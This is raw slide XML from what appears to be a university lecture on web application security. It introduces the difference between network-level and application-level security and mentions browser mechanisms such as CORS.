            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="2" sz="half"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:prstGeom prst="rect"/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="55244" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="349885" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="434"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Focuses</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>protecting 	communication</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-105"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>channels</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>infrastructure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="654685" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1055"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Protects</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-105"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>against</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>attacks 	targeting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>network</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>layer </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>sniffing,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>MitM,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>…)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="960"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-114"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>filtering</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>invalid</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-105"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>requests</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>blocking</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Firewall,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>properly </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>encrypting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-125"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>traffic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962050" y="560908"/>
            <a:ext cx="4099560" cy="574675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150"/>
              <a:t>NETWORK-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t>LEVEL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6251828" y="553034"/>
            <a:ext cx="4872355" cy="5746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600" spc="50" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>APPLICATION-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="3600" spc="-65" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>LEVEL</a:t>
            </a:r>
            <a:endParaRPr sz="36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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld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60"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-185"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t>APPLICATION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-175"/>
              <a:t>SECURITY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr="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60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="891540" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>Network-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>level</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>topic</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Computer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Networks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Network</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="633095" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>In</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>course,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>concerned</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>how</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>design</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>develop</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>modern</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>apps.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>We</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>therefore</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>focus</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>Application-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>level</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>security,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>make </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>sure</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>develop</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>contain</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>security 	vulnerabilities!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="151130" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1010"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>We</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>also</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>explore</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>key</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-105"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>mechanisms</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>implemented</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>in </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>modern</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>browsers</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>(e.g.:,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CORS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>),</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>so</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>know</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>how</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>work</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>with 	them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55"/>
              <a:t>HOW</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
